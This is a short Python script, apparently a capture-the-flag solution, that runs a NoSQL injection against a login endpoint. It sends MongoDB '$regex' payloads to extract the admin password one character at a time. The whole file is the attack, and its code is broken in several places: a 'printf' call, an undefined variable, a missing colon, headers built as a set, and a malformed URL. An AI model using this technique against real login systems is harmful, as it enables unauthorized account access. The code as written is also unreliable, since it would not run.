
#!/usr/bin/env python3

import requests
import string



url="http://ip:30758"
headers={"content-type","application/json"}

found_chars= list("CHTB")

while True:
	for c in string.printable:
		if c not in ["*","+",".","?","|",'"','\\']

			printf(f"payload used : {''.join(found_chars) + c} ")
			payload =('{"username":{"$eq":"admin"}, "password":{"$regex":"^%s"}}'
					  % ("".join(leaked_data)+ c,))
			
			r=requests.post(url+"api/login",data=payload,headers=headers)

			if r.json() == {
					"logged" :1,
					"message":"Login Successfull, welcome back admin.",
			}:
				found_chars.append(c)
				break




